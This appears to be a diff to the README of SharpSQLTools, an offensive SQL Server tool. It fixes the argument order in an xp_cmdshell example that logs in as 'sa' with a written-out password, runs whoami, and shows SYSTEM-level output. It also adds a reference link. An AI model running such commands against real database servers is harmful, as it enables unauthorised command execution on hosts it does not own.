@@ -66,7 +66,7 @@ SharpSQLTools target username password database module command    - non-interact
 #### xp_cmdshell执行命令
 
 ```
-λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX xp_cmdshell whoami master
+λ SharpSQLTools.exe 192.168.28.27 sa 1qaz@WSX xp_cmdshell master whoami 
 [*] Database connection is successful!
 
 nt authority\system
@@ -202,3 +202,5 @@ https://github.com/blackarrowsec/mssqlproxy
 https://github.com/An0nySec/ShadowUser/blob/main/ShadowUser/Program.cs#L235
 
 https://github.com/GhostPack/SharpDump
+
+https://gist.github.com/jfmaes/944991c40fb34625cf72fd33df1682c0
